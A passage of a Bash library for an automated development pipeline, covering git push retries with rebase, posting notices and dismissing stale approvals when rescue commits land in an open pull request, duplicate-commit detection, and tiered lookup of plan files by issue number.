        elif [ "$ancestry_rc" -eq 1 ]; then
            push_mode="diverged"
        else
            # Ancestry probe itself errored (shallow clone, missing objects).
            # Fall back to plain push — this is current behavior, not a
            # regression. If the remote diverged, the push will reject as
            # non-fast-forward and land in the FAILED arm below. We do NOT
            # silently force on uncertain state (mika#1364 F2).
            push_mode="fast-forward"
            echo "WARN: push_branch ancestry probe failed (rc=$ancestry_rc) — falling back to plain push" >&2
        fi
    fi
    # First-push case (no origin/$BRANCH ref) — always push.
    # (Sub-PR 7b retired the Class D recovery shim's first-push path;
    # this helper is now the sole git-push site for dev-groom dispatches.)

    # Push with upstream tracking (-u sets upstream on first push).
    # Diverged branches use --force-with-lease to land rebased history
    # without clobbering concurrent remote advances (mika#1364 KTD-1).
    #
    # Race-recovery (mika#1857, rupture B — 30% of pilot-throughput failures):
    # A single-shot push can fail with "remote advanced since fetch" when the
    # remote branch changed between our initial `git fetch origin $BRANCH`
    # (line 1281) and this push (~2 min later). Concurrent activity that
    # advances the remote branch: staleness-check workflow adding labels /
    # pushing metadata commits, main-branch merges reflected on the branch,
    # sibling pushes. The single-shot behavior stranded commits local-only
    # in incidents #22/#23/#24 (2026-07-27).
    #
    # `_push_with_rebase_retry` wraps push_cmd in a bounded retry chain:
    # on race-shaped rejection, fetch origin/main + rebase + retry (max 2
    # attempts). Non-race failures (credential, network, hook rejection) do
    # NOT retry — the race detection is `rejected|fetch first|remote contains
    # work` substring match. Rebase conflicts abort the rebase and bail to
    # the existing FAILED path, preserving the wip-rescue draft flow.
    local push_err
    push_err=$(mktemp /tmp/push-branch-err-XXXXXX)
    if _push_with_rebase_retry "$push_mode" "$push_err"; then
        echo "push_branch: pushed $BRANCH to origin (mode=$push_mode)" >&2
        RESULT="${RESULT}
Push: pushed to origin/$BRANCH (mode=$push_mode)"
    else
        local push_err_content
        push_err_content=$(cat "$push_err" 2>/dev/null)
        echo "WARN: push_branch_failed for $BRANCH — commits remain local-only" >&2
        cat "$push_err" >&2
        # Distinguish lease-stale abort from other push failures (mika#1364).
        # After the retry-with-rebase loop, if we still see race-shaped errors,
        # the retry either exhausted or the rebase failed — either way, the
        # commits are stranded and the FAILED semantics stand.
        if grep -q -- "stale info\|expected old/new\|failed to push" <<<"$push_err_content"; then
            RESULT="${RESULT}
Push: FAILED — remote advanced since fetch (lease aborted); commits remain local-only on $BRANCH"
        else
            RESULT="${RESULT}
Push: FAILED — commits remain local-only on $BRANCH"
        fi
    fi
    rm -f "$push_err"
}

# `_push_with_rebase_retry` — race-recovery wrapper for _push_branch's push_cmd
# (mika#1857, rupture B). Attempts push up to MAX_ATTEMPTS times; on race-shaped
# rejection, fetches origin/main and rebases the current branch before retrying.
# Non-race failures short-circuit (no retry). Rebase conflicts abort and bail
# to caller's FAILED path.
#
# Inputs:
#   $1 = push_mode ("diverged"|"fast-forward"|"first-push") — controls whether
#        we use --force-with-lease or plain push
#   $2 = err_file  — mktemp path the caller uses to capture stderr for post-fail
#        classification (mika#1364 lease-stale detection)
#
# Reads globals set by _push_branch: WORKTREE_DIR, BRANCH
# Writes stderr on retry attempts + rebase abort for operator observability.
#
# Returns 0 on eventual push success, 1 on unrecoverable failure.
_push_with_rebase_retry() {
    local push_mode="$1"
    local err_file="$2"
    local max_attempts=2
    local attempt=1
    local push_cmd

    # Reconstruct the push_cmd based on mode (mirrors caller's construction).
    # Post-rebase attempts always use --force-with-lease because the rebase
    # rewrote history — a plain push would non-ff-reject even after fetching
    # the remote's new state.
    if [ "$push_mode" = "diverged" ]; then
        push_cmd=(git -C "$WORKTREE_DIR" push --force-with-lease="$BRANCH:origin/$BRANCH" -u origin "$BRANCH")
    else
        push_cmd=(git -C "$WORKTREE_DIR" push -u origin "$BRANCH")
    fi

    while [ "$attempt" -le "$max_attempts" ]; do
        # Truncate err_file for this attempt so the caller's post-fail parsing
        # sees only the LAST attempt's stderr (mika#1364 lease-stale detection).
        : > "$err_file"

        if "${push_cmd[@]}" >/dev/null 2>"$err_file"; then
            [ "$attempt" -gt 1 ] && echo "_push_with_rebase_retry: succeeded on attempt $attempt/$max_attempts after rebase (branch=$BRANCH)" >&2
            return 0
        fi

        # Classify: is this a push-race (recoverable) or a hard failure
        # (credential/network/hook — do NOT retry)?
        # Broad match across git versions:
        #   - "rejected"           — most git versions
        #   - "fetch first"        — hint line on non-ff reject
        #   - "remote contains work" — verbose form
        # A lease-stale rejection also matches "rejected" (git's shared prefix).
        if ! grep -qE 'rejected|fetch first|remote contains work' "$err_file"; then
            # Non-race failure — do NOT retry. Bail immediately so the caller's
            # FAILED path fires with the original stderr.
            [ "$attempt" -gt 1 ] && echo "_push_with_rebase_retry: non-race failure on attempt $attempt — bailing" >&2
            return 1
        fi

        # If this was the last attempt, do NOT rebase (nothing to retry after) —
        # bail with the race-shaped stderr so caller's mika#1364 branch fires.
        if [ "$attempt" -ge "$max_attempts" ]; then
            echo "_push_with_rebase_retry: exhausted $max_attempts attempts on race errors — bailing to draft rescue (branch=$BRANCH)" >&2
            return 1
        fi

        echo "_push_with_rebase_retry: race-shaped rejection on attempt $attempt/$max_attempts — fetching + rebasing (branch=$BRANCH)" >&2

        # Fetch fresh origin/main. Fetch failure = network/auth — do not retry.
        if ! git -C "$WORKTREE_DIR" fetch origin main >/dev/null 2>&1; then
            echo "_push_with_rebase_retry: fetch origin main failed — bailing (branch=$BRANCH)" >&2
            return 1
        fi

        # Rebase onto fresh origin/main. Conflicts → abort + bail.
        # The abort leaves the branch in pre-rebase state so caller's existing
        # wip-rescue draft path can push the un-rebased commits (with the
        # wip-rescue label indicating operator must resolve conflicts manually).
        if ! git -C "$WORKTREE_DIR" rebase origin/main >/dev/null 2>&1; then
            echo "_push_with_rebase_retry: rebase conflict — aborting rebase + bailing to draft rescue (branch=$BRANCH)" >&2
            git -C "$WORKTREE_DIR" rebase --abort >/dev/null 2>&1 || true
            return 1
        fi

        echo "_push_with_rebase_retry: rebase succeeded on attempt $attempt — retrying push (branch=$BRANCH)" >&2

        # After a successful rebase, history was rewritten — the next push
        # MUST use --force-with-lease even if the original push_mode was
        # "fast-forward" or "first-push". Swap to lease-guarded push.
        push_cmd=(git -C "$WORKTREE_DIR" push --force-with-lease="$BRANCH:origin/$BRANCH" -u origin "$BRANCH")

        attempt=$((attempt + 1))
    done

    # Unreachable — the loop exits via early return or exhausts on line 1394.
    # Defensive: bail if we somehow fall through.
    return 1
}

# ---------------------------------------------------------------------------
# mika#2151 — the rescue net announces its arrival in an already-open PR.
#
# The net (mika#1282 dirty-worktree, mika#1383 trailing content) commits pilot
# work and pushes it. When the branch already carries an open PR, that content
# enters a PR someone may already have stamped, and nothing said so. PR#2147 is
# the measured case: a formal QA approval comment at 00:46:51Z, a second rescue
# commit at 04:40:45Z, and a human writing the invalidation notice BY HAND 128
# seconds later. The mechanism held the proof and spent none of it.
#
# THE TRIGGER IS "A PR IS OPEN", NEVER "A PR IS APPROVED". At 04:40:45Z no
# review had ever reached the APPROVED state — the first one is 04:49:33Z, nine
# minutes LATER. The stamp in force was prose in a comment. A design keyed on
# reviewDecision would have stayed silent on the very incident that motivated
# it. Dismissal is a secondary, conditional gesture; the comment carries AC1.
#
# These functions sit here, after the push helpers, because signalling is
# strictly a post-push concern: a commit that never reached origin changed
# nothing an operator can see, so there is nothing to announce.
# ---------------------------------------------------------------------------

# Record a rescue commit on the per-dispatch accumulator. Called from every
# site that produces a `wip(` rescue commit, BEFORE its push — the accumulator
# is about what the net produced, not about what reached origin.
#
# An accumulator, not a boolean: PR#2147 took TWO mika#1282 rescues in one
# lineage (e3fe1724 then 628099ef) and a boolean would have reported one.
#
# Not scoped to dev-pilot, unlike RESCUED_DIRTY_WORKTREE (which gates draft-PR
# creation). Since mika#2031 the net also covers dev-groom, and a regroom
# redispatched onto a branch carrying an open PR is the same danger.
#
# Reads: WORKTREE_DIR. Writes: RESCUE_COMMITS.
_record_rescue_commit() {
    local _sha
    _sha=$(git -C "$WORKTREE_DIR" rev-parse HEAD 2>/dev/null || true)
    [ -n "$_sha" ] || return 0
    RESCUE_COMMITS="${RESCUE_COMMITS:+${RESCUE_COMMITS}
}${_sha}"
}

# The recorded SHAs not yet reported on a PR, one per line, empty when none.
# Set difference done with `case` rather than `grep -f`: an empty SIGNALLED set
# is the common case, and an empty grep pattern matches every line — which
# would silently report "nothing pending" on the first rescue of every dispatch.
_unsignalled_rescue_commits() {
    local _sha _seen
    _seen="
${RESCUE_COMMITS_SIGNALLED:-}
"
    while IFS= read -r _sha; do
        [ -n "$_sha" ] || continue
        case "$_seen" in
            *"
${_sha}
"*) continue ;;
        esac
        printf '%s\n' "$_sha"
    done <<< "${RESCUE_COMMITS:-}"
}

# Move SHAs into the reported set so the second call site does not repeat what
# the first already said. Reset per dispatch (in _run_claude_pilot), so a LATER
# dispatch that rescues again speaks again.
_mark_rescue_commits_signalled() {
    local _list="${1:-}"
    [ -n "$_list" ] || return 0
    RESCUE_COMMITS_SIGNALLED="${RESCUE_COMMITS_SIGNALLED:+${RESCUE_COMMITS_SIGNALLED}
}${_list}"
}

# Announce, on the PR itself, that the net just committed into it.
#
# Cost model, and the entry guard is the whole of it:
#   N1 — no rescue happened (the majority case of a healthy loop): the guard
#        returns 0 BEFORE any `gh` call. Zero latency, zero quota, no network
#        dependency added to a dispatch that did nothing wrong.
#   N2 — a rescue happened, no PR is open (the nominal case of AC2): one
#        `gh pr list` read, zero mutation. Irreducible — "is a PR open?" cannot
#        be answered without asking — and paid only by a dispatch that has
#        already committed rescued work.
#
# Every gesture is fail-open. The commits are on the branch and pushed by the
# time this runs; it only ever writes ALONGSIDE them, so no path here can fail
# the dispatch or lose the work (AC3).
#
# Reads: REPO, BRANCH, WORKTREE_DIR, ISSUE_NUM, SESSION_ID, LOG_ID,
#        RESCUE_COMMITS, RESCUE_COMMITS_SIGNALLED.
# Writes: RESULT, RESCUE_COMMITS_SIGNALLED.
_signal_rescue_into_open_pr() {
    [ -n "${REPO:-}" ] && [ -n "${BRANCH:-}" ] && [ -n "${WORKTREE_DIR:-}" ] || return 0

    local _pending
    _pending=$(_unsignalled_rescue_commits)
    [ -n "$_pending" ] || return 0

    local _open_pr
    _open_pr=$(gh pr list --repo "senara-solutions/$REPO" --head "$BRANCH" \
                 --state open --json number,reviewDecision --jq '.[0] // empty' 2>&9 || true)

    if [ -z "$_open_pr" ]; then
        # AC2. The net commits and pushes exactly as before; the only difference
        # is one read. No PR write, no RESULT line, one line of stderr.
        echo "rescue_signal.no_open_pr: branch=${BRANCH} rescued=$(printf '%s' "$_pending" | tr '\n' ' ')" >&2
        _mark_rescue_commits_signalled "$_pending"
        return 0
    fi

    local _n _decision
    _n=$(printf '%s' "$_open_pr" | jq -r '.number // empty' 2>/dev/null || true)
    _decision=$(printf '%s' "$_open_pr" | jq -r '.reviewDecision // empty' 2>/dev/null || true)
    if [ -z "$_n" ]; then
        # Do NOT mark signalled: the answer was unreadable, not negative. The
        # second call site gets another chance at it.
        echo "rescue_signal.pr_list_unparseable: branch=${BRANCH} payload=$(printf '%s' "$_open_pr" | head -c 200)" >&2
        return 0
    fi

    # --- Gesture 1: the comment. This is what carries AC1. ---
    # It is posted FIRST and unconditionally, so a token without dismissal
    # rights (see the mika#2151 Step 0 probe) still leaves the operator told.
    local _body_file _sha _subject _stat _cumulative
    _body_file=$(mktemp "${TMPDIR:-/tmp}/mika-rescue-signal.XXXXXX")
    {
        printf '## Le filet de récupération a commité dans cette PR (mika#2151)\n\n'
        printf 'Le contenu de cette PR a changé **après** son ouverture : `dispatch-lib` a sauvé du travail que la session pilote avait écrit sans le commiter. Une approbation ou une revue antérieure à ces commits **ne les couvre pas**.\n\n'
        printf '### Commits ajoutés par le filet\n\n'
        while IFS= read -r _sha; do
            [ -n "$_sha" ] || continue
            _subject=$(git -C "$WORKTREE_DIR" log -1 --format='%h %s' "$_sha" 2>/dev/null \
                       || printf '%s (sujet illisible)' "$_sha")
            _stat=$(git -C "$WORKTREE_DIR" diff --shortstat "${_sha}^" "$_sha" 2>/dev/null || true)
            printf -- '- `%s`\n  %s\n' "$_subject" "${_stat:-<shortstat indisponible>}"
        done <<< "$_pending"
        _cumulative=$(git -C "$WORKTREE_DIR" diff --shortstat origin/main...HEAD 2>/dev/null || true)
        printf '\n### Delta cumulé de la branche\n\n'
        printf '`git diff --shortstat origin/main...HEAD` : %s\n\n' "${_cumulative:-<indisponible>}"
        printf '### Provenance\n\n'
        printf -- '- Ticket : `%s#%s`\n' "${REPO:-<inconnu>}" "${ISSUE_NUM:-<inconnu>}"
        printf -- '- Session pilote : `%s`\n' "${SESSION_ID:-unknown}"
        printf -- '- Log : `%s`\n' "${LOG_ID:-unknown}"
        printf -- '- Branche : `%s`\n' "$BRANCH"
        printf -- '\nPosté par `dispatch-lib` (mika#2151). Le geste équivalent était écrit à la main jusqu'"'"'ici.\n'
    } > "$_body_file"

    if gh pr comment "$_n" --repo "senara-solutions/$REPO" --body-file "$_body_file" 2>&9; then
        echo "rescue_signal.commented: pr=${_n} branch=${BRANCH}" >&2
    else
        echo "rescue_signal.comment_failed: pr=${_n} branch=${BRANCH} — the rescue commits are on the branch and pushed; only the notice failed" >&2
    fi
    rm -f "$_body_file"

    # --- Gesture 2: the label. Makes the class greppable across PRs. ---
    if ! gh pr edit "$_n" --repo "senara-solutions/$REPO" --add-label "rescue-after-review" 2>&9; then
        echo "rescue_signal.label_failed: pr=${_n} label=rescue-after-review" >&2
    fi

    # --- Gesture 3: the dismissal. Conditional and secondary. ---
    # On the founding incident this would NOT have fired (no APPROVED state at
    # 04:40:45Z), and its absence must never suppress the comment above.
    #
    # `PUT …/dismissals` rather than `gh pr review --request-changes`: the
    # latter refuses to act on a PR the token authored ("Can not request changes
    # on your own pull request"), which is exactly mika-platform-bot[bot]'s
    # position on every rescue PR. Dismissal depends only on write access.
    #
    # It is also the machine brake: a DISMISSED review fails
    # ci_success_handler.rs:716's `state != "APPROVED"` rejection, so the
    # auto-merge gate closes without touching the Rust engine.
    local _dismissed=0
    if [ "$_decision" = "APPROVED" ]; then
        local _review_ids _id
        _review_ids=$(gh api "/repos/senara-solutions/$REPO/pulls/$_n/reviews" \
                        --jq '.[] | select(.state=="APPROVED") | .id' 2>&9 || true)
        while IFS= read -r _id; do
            [ -n "$_id" ] || continue
            if gh api --method PUT \
                 "/repos/senara-solutions/$REPO/pulls/$_n/reviews/$_id/dismissals" \
                 -f message="dispatch-lib (mika#2151) : le filet de récupération a commité sur cette branche après cette approbation. L'approbation ne couvre plus le contenu de la PR — voir le commentaire détaillant les commits ajoutés." \
                 -f event=DISMISS 2>&9; then
                _dismissed=$((_dismissed + 1))
            else
                echo "rescue_signal.dismiss_failed: pr=${_n} review=${_id} — approval left in place (token may lack pull_requests:write); the comment above still stands" >&2
            fi
        done <<< "$_review_ids"
    fi

    # Carry the fact into the callback so the parent task records it too — the
    # PR comment is for the operator, this line is for the ledger. Deliberately
    # NOT routed through _set_pr_status_line: that helper owns the single
    # canonical `PR:`/`NO_PR:` line and this is neither.
    local _count _dismiss_note
    _count=$(printf '%s\n' "$_pending" | grep -c '[^[:space:]]' || true)
    _dismiss_note=""
    [ "$_dismissed" -gt 0 ] && _dismiss_note="; ${_dismissed} stale approval(s) dismissed"
    RESULT="${RESULT}
Rescue-signal (mika#2151): ${_count} rescue commit(s) landed in already-open PR #${_n} on ${BRANCH}. A notice was posted there and the \`rescue-after-review\` label applied${_dismiss_note}."

    _mark_rescue_commits_signalled "$_pending"
    return 0
}

_check_duplicate_commits() {
    # Pre-push guard: detect commits on the branch that are patch-equivalent
    # to commits already on origin/main. These duplicates cause
    # mergeable=CONFLICTING on GitHub even though content is identical.
    # See mika#784 for the observed failure mode.
    #
    # Uses git log --cherry-mark --right-only which shows commits on HEAD
    # that do NOT have a patch-equivalent on origin/main. By inverting
    # (--left-right --cherry-mark), we can detect commits marked as '='
    # (equivalent on both sides).

    [ -n "$WORKTREE_DIR" ] || return 0

    # Fetch fresh main to compare against.
    # Failure-open: if fetch fails (network, auth), skip the guard but warn.
    # Rationale: don't block push on connectivity; but surface the degraded state
    # so dispatch logs show the guard was skipped. (review-guide.md § Single Responsibility)
    if ! git -C "$WORKTREE_DIR" fetch origin main 2>/dev/null; then
        echo "WARN: duplicate-commit guard skipped — could not fetch origin/main" >&2
        return 0
    fi

    # Find commits on HEAD that are patch-equivalent to commits on origin/main.
    # --cherry-mark marks equivalent commits with '=' prefix.
    # --right-only shows only commits on the right side (HEAD).
    # Equivalent commits on HEAD = duplicates that will conflict.
    local duplicates
    duplicates=$(git -C "$WORKTREE_DIR" log --cherry-mark --right-only \
        --format="%m %H %s" origin/main...HEAD 2>/dev/null \
        | grep "^=" || true)

    [ -z "$duplicates" ] && return 0

    # Duplicates found — attempt automatic rebase to clean them up
    echo "WARN: duplicate-commit guard found patch-equivalent commits on branch:" >&2
    echo "$duplicates" >&2
    echo "Attempting rebase onto origin/main to deduplicate..." >&2

    # Capture rebase stderr instead of discarding to /dev/null (mika#1364 AC#4).
    local dedup_rebase_err
    dedup_rebase_err=$(mktemp "${TMPDIR:-/tmp}/dispatch-lib-dedup-rebase-err.XXXXXX")
    if git -C "$WORKTREE_DIR" rebase origin/main 2>"$dedup_rebase_err"; then
        echo "Rebase succeeded — duplicate commits resolved." >&2
        rm -f "$dedup_rebase_err"
        return 0
    fi

    # Rebase failed — capture reason BEFORE --abort resets the index.
    local dedup_conflicts dedup_reason
    dedup_conflicts=$(git -C "$WORKTREE_DIR" diff --name-only --diff-filter=U 2>/dev/null | tr '\n' ' ')
    dedup_reason=$(cat "$dedup_rebase_err" 2>/dev/null | head -20)
    git -C "$WORKTREE_DIR" rebase --abort 2>/dev/null || true
    rm -f "$dedup_rebase_err"
    echo "ERROR: duplicate-commit rebase failed. Branch has commits equivalent to main:" >&2
    echo "$duplicates" >&2
    echo "Rebase stderr: ${dedup_reason:-<empty>}" >&2
    RESULT="${RESULT}
Dedup-rebase failed (${dedup_conflicts:+conflict: $dedup_conflicts}${dedup_conflicts:-other}): ${dedup_reason:-<no stderr>}"
    return 1
}

# ============================================================================
# Iterate-loop primitives (mika#1271 contract refactor — Phase A/B/C).
#
# These helpers are wired into `_iterate_groom_loop` and into
# `_post_flight_recovery`, which calls `_find_issue_plan` on every dev-groom
# dispatch — they are NOT dormant. The original v1 note claiming "no call
# sites in the live dispatch path" was left behind when the wiring landed, and
# it hid the blast radius of mika#2038: the plan this function picks is written
# into the issue body as the `> - **Plan:**` callout, which `_detect_plan_on_branch`
# later reads back to build the pilot's entry command. See
# docs/plans/2026-05-25-003-feat-1271-iterate-loop-state-machine-plan.md.
# ============================================================================

_plan_header_claimed_issues() {
    # mika#2038: every issue number the plan's header zone claims, one per line
    # (empty when it claims none).
    #
    # The claim pattern is deliberately WIDER than tier 2's match pattern.
    # Tier 2 requires `mika[[:space:]]?(issue)?#N`; the founding incident's
    # header is `**Issue:** #539` — no `mika` prefix — so a tier-2-shaped probe
    # would not see it and the bug would have survived the fix. It also reads
    # the bare-numeric YAML shapes (`issue: 1679`, `number: 3030`) that
    # mika#1617 taught tier 3, and tolerates an org/repo prefix
    # (`issue: senara-solutions/mika#1772`).
    #
    # Three deliberate narrowings, each found by probing real plans rather than
    # fixtures — every one of them costs a false negative when it is missing:
    #   - The label starts the line (optionally after a list dash and bold
    #     markers), exactly as tier 2 anchors its own match. Unanchored, `id`
    #     matched inside `groom_session_id: 557a7808-…` and refuted mika#1469's
    #     own plan with a claim of "issue 557"; `Related issue: #456` was read
    #     as ownership rather than as the cross-reference it is; and the prose
    #     `The issue: 3 phases remain` claimed issue 3.
    #   - `id` is not a refuting label at all. `session_id`, `run_id` and friends
    #     are common in plan frontmatter and almost never carry an issue number,
    #     so reading them as claims costs false negatives and buys nothing.
    #   - Every `#N` on a label line counts, not just the last one: a greedy
    #     single-match read of `**Ticket:** mika#1772/#1773` saw only 1773 and
    #     would have refuted that plan for its own issue 1772.
    # Tier 3's broad scan still reads `id:` and unanchored prose — it is looking
    # for a reason to ACCEPT, where a wrong guess is recoverable and the
    # refutation below is the compensating guard. Refutation looks for a reason
    # to REJECT, where a wrong guess hides a plan that exists.
    #
    # Header zone is the first 20 lines, the same scope tier 2 uses: body prose
    # quoting another ticket's header must not be read as a claim (the
    # false-positive mika#1421's v1 self-test hit).
    local candidate="$1"
    [ -n "$candidate" ] && [ -r "$candidate" ] || return 0
    local label_lines
    label_lines=$(head -n 20 "$candidate" 2>/dev/null \
        | grep -iE '^[[:space:]]*(-[[:space:]]+)?(\*\*)?(ticket|issue|number)(:\*\*|:)')
    [ -n "$label_lines" ] || return 0
    {
        # Every `#N` on a label line, not just the last: a header may name two
        # tickets in one field (`**Ticket:** mika#1772/#1773`).
        printf '%s\n' "$label_lines" | grep -oE '#[0-9]+' | tr -d '#'
        # A bare numeric value sitting directly after the label (`issue: 1679`).
        printf '%s\n' "$label_lines" \
            | sed -E 's/^[[:space:]]*(-[[:space:]]+)?(\*\*)?[A-Za-z]+(:\*\*|:)[[:space:]]*//' \
            | grep -oE '^[0-9]+'
    } | sort -u
}

_plan_header_refutes_issue() {
    # mika#2038: does this plan's header claim an issue OTHER than $2?
    #
    # Refutation, not confirmation. A candidate is rejected only on positive
    # evidence that it belongs to a different ticket. Silence is NOT evidence:
    # 95 of the 745 plans in docs/plans/ carry no issue marker at all, and
    # requiring a positive header match would make every one of them
    # undiscoverable at tier 1 — reopening the false-negative class bound by
    # mika#1421 (n=2), mika#1602 (n=3) and mika#1617 (N=5).
    #
    # A header naming several issues refutes only when NONE of them is the
    # target: a plan for one ticket may legitimately cite others in its title.
    #
    # Args: $1 = candidate path, $2 = target issue number.
    # Returns 0 when refuted, 1 otherwise (including on unreadable input —
    # fail-open, because acceptance is the safe direction here).
    local candidate="$1" issue_num="$2"
    [ -n "$candidate" ] && [ -n "$issue_num" ] || return 1

    local claimed
    claimed=$(_plan_header_claimed_issues "$candidate")
    [ -n "$claimed" ] || return 1

    local n
    while IFS= read -r n; do
        [ "$n" = "$issue_num" ] && return 1
    done <<< "$claimed"

    return 0
}

_plan_filename_issue_slot() {
    # mika#2038: the issue number sitting in the canonical filename slot of
    # `<date>-<NNN>-<type>-<issue>-<slug>-plan.md`, or empty when the name does
    # not honour that shape. Only 255 of 745 real plans do, which is why this
    # ranks survivors (KTD4) and never filters candidates.
    printf '%s' "${1##*/}" \
        | sed -nE 's/^[0-9]{4}-[0-9]{2}-[0-9]{2}-[0-9]+-[a-z]+-([0-9]+)-.*/\1/p'
}

_find_issue_plan() {
    # Locate the plan file for $REPO#$ISSUE_NUM in $WORKTREE_DIR/docs/plans.
    #
    # Three-tier discovery, evaluated in strict order (first match wins):
    #
    # Tier 1 (filename): glob `*-${ISSUE_NUM}-*-plan.md`, then refute and rank
    #          (the convention most existing plans follow:
    #          e.g. `2026-06-05-001-fix-1407-pilot-push-diagnosis-plan.md`).
    #          mika#2038: the glob matches ANY hyphen-delimited 4-digit run,
    #          wherever it sits in the name — a RustSec advisory id, a year in
    #          a slug, another ticket cited in the plan's title. For
    #          ISSUE_NUM=2026 it matched `rustsec-2026-0097` and a pilot
    #          dispatched for mika#2026 was launched on an April plan about
    #          bumping `rand`. Tier 1 returned first, so tiers 2 and 3 — which
    #          read the header and would have found the right plan — never ran.
    #          The tier now collects every candidate, discards the ones whose
    #          header names a DIFFERENT issue, and ranks the survivors by
    #          filename slot position. The glob stays permissive on purpose:
    #          only 255 of the 745 plans in docs/plans/ honour the
    #          `<date>-<NNN>-<type>-<issue>-` slot, so an exclusive positional
    #          filter would trade this one false positive for ~490 false
    #          negatives — the very class tiers 2 and 3 exist to catch.
    #
    # Tier 2 (anchored header): grep first 20 lines for four prefixes
    #          (`**Ticket:**`, `**Issue:**`, `ticket:`, `issue:`) followed
    #          by `mika ... #${ISSUE_NUM}`. The pilot is instructed to set
    #          `**Ticket:** mika issue#N` in the plan header but may also
    #          name the plan with a date-prefix slug-tail that does NOT
    #          embed the issue number (e.g. mika#771 wrote
    #          `2026-06-06-003-feat-post-condition-guard-send-message-plan.md`).
    #          Without this fallback, `_iterate_groom_loop` returns 1, the
    #          architect is never called, and the ticket lands in a half-state
    #          (plan committed, verdict missing). This is the founding
    #          incident for mika#1421 — bound at n=2 on 2026-06-06 across
    #          mika#1381 (n=1, 11:37Z) and mika#771 (n=2, 17:29Z).
    #          Header-zone scope (20 lines) prevents false-positives from
    #          body prose that quotes other tickets' headers (mika#1421).
    #
    # Tier 3 (broad content scan): grep first 50 lines for bare `#N` or
    #          YAML key patterns (`issue:`, `ticket:`, `number:`, `id:`)
    #          with bare numeric value. Catches plan shapes where the issue
    #          number appears in a non-standard format — parenthesized in
    #          H1, `Closes #N`, YAML `number: N`, etc. Wider zone (50 lines)
    #          covers preamble sections below frontmatter. (mika#1617, N=5.)
    #
    # All tiers apply the >500-byte filter (mika#1033) and return the
    # most-recent match. Prints the absolute plan path on success; returns
    # non-zero with no stdout on failure. Callers must check `[ -n ... ]`
    # AND `[ -r ... ]` exactly as before.
    # Cleared on entry, deliberately WITHOUT `local` (same contract as
    # GROOM_LOOP_FAILURE_REASON below): callers read it after the function
    # returns, to tell "no candidate existed" apart from "a candidate existed
    # and was deliberately discarded". Those two states need different operator
    # advice and used to be reported identically. mika#2038.
    FIND_ISSUE_PLAN_REFUTED=""

    [ -n "$WORKTREE_DIR" ] && [ -n "$ISSUE_NUM" ] || return 1

    # Primary: filename-embedded issue number, refuted by header, ranked by slot
    local plan_path candidate claimed
    local in_slot="" off_slot=""
    while IFS= read -r candidate; do
        [ -n "$candidate" ] && [ -r "$candidate" ] || continue
        if _plan_header_refutes_issue "$candidate" "$ISSUE_NUM"; then
            claimed=$(_plan_header_claimed_issues "$candidate" | tr '\n' ' ')
            echo "_find_issue_plan: tier 1 discarded ${candidate} — its header claims issue ${claimed% } not ${ISSUE_NUM}" >&2
            FIND_ISSUE_PLAN_REFUTED="${FIND_ISSUE_PLAN_REFUTED}${FIND_ISSUE_PLAN_REFUTED:+, }${candidate##*/} (claims ${claimed% })"
            continue
        fi
        if [ "$(_plan_filename_issue_slot "$candidate")" = "$ISSUE_NUM" ]; then
            in_slot="${in_slot}${candidate}"$'\n'
        else
            off_slot="${off_slot}${candidate}"$'\n'
        fi
    done < <(find "$WORKTREE_DIR/docs/plans" \
        -name "*-${ISSUE_NUM}-*-plan.md" -size +500c 2>/dev/null \
        | sort -r)

    plan_path=$(printf '%s' "$in_slot" | head -1)
    if [ -n "$plan_path" ]; then
        echo "_find_issue_plan: tier 1 selected ${plan_path} (issue number in the canonical filename slot)" >&2
    else
        plan_path=$(printf '%s' "$off_slot" | head -1)
        [ -n "$plan_path" ] && echo "_find_issue_plan: tier 1 selected ${plan_path} (most recent surviving candidate; none carries the issue number in the canonical filename slot)" >&2
    fi
    if [ -n "$plan_path" ] && [ -r "$plan_path" ]; then
        printf '%s' "$plan_path"
        return 0
    fi

    # Fallback: content references the issue. Pattern handles four
    # header shapes the pilot has been observed to produce in plan headers:
    #   **Ticket:** mika issue#N    (current `/mika-groom-plan-only` shape)
    #   **Ticket:** mika#N          (older convention)
    #   **Issue:** mika#N           ("Issue" synonym, matches GitHub's UI; mika#1602)
    #   ticket: mika#N              (YAML frontmatter)
    #   issue: mika#N               (YAML frontmatter, "Issue" synonym; mika#1602)
    #
    # mika#1602 (n=3) widened the union to add the `**Issue:**` / `issue:`
    # branches after mika#1600's dev-groom dispatch wrote `**Issue:** mika#1600`
    # and BOTH passes missed (filename had no `-1600-` token AND the header was
    # not `**Ticket:**`). Founding cases for the content-fallback itself were
    # mika#1421 (n=2: mika#1381 + mika#771, both filename-shape gaps).
    #
    # Header-zone scope: the grep is restricted to the first 20 lines of
    # each plan file. The canonical ticket reference always sits in YAML
    # frontmatter or the markdown header above the Problem section.
    # Without this scope, a plan that QUOTES another ticket's `**Ticket:**`
    # line in body prose (e.g. to illustrate a founding incident) would
    # false-positive — observed during the mika#1421 v1 self-test where
    # the #1421 plan quoted mika#771's header on line 49 and matched
    # `ISSUE_NUM=771`. Headers stay in the first 20 lines; bodies don't.
    while IFS= read -r candidate; do
        [ -r "$candidate" ] || continue
        if head -n 20 "$candidate" 2>/dev/null \
            | grep -qE "^(\*\*Ticket:\*\*|\*\*Issue:\*\*|ticket:|issue:)\s+mika[[:space:]]?(issue)?#${ISSUE_NUM}\b"; then
            printf '%s' "$candidate"
            return 0
        fi
    done < <(find "$WORKTREE_DIR/docs/plans" -name "*-plan.md" -size +500c 2>/dev/null | sort -r)

    # Tier 3: broad issue-number reference in header zone (first 50 lines).
    # Catches plan shapes where the issue number appears in a non-standard
    # format — parenthesized in H1, bare `#N` in summary, YAML `number: N`,
    # etc. Wider zone (50 lines vs tier-2's 20) to cover preamble sections
    # that sit below frontmatter. (mika#1617, N=5 founding incidents.)
    while IFS= read -r candidate; do
        [ -r "$candidate" ] || continue
        if head -n 50 "$candidate" 2>/dev/null \
            | grep -qE "(#${ISSUE_NUM}\b|(issue|ticket|number|id):[[:space:]]*${ISSUE_NUM}\b)"; then
            # mika#2038: tier 3 matches a plan that merely MENTIONS the number
            # anywhere in its first 50 lines — a Problem Frame naming the
            # incident it fixes, a Sources list, a lineage note. Refuting only
            # at tier 1 moved the bug rather than closing it: for ISSUE_NUM=2026
            # tier 1 correctly discarded the April `rand` plan and tier 3 then
            # handed back a plan belonging to mika#2038, so the pilot was still
            # launched on a foreign plan. Same shape for #1383 → the #1685 plan.
            # Tier 2 needs no such guard: it matches an anchored header that
            # names THIS issue, so a candidate it accepts can never be refuted.
            if _plan_header_refutes_issue "$candidate" "$ISSUE_NUM"; then
                claimed=$(_plan_header_claimed_issues "$candidate" | tr '\n' ' ')
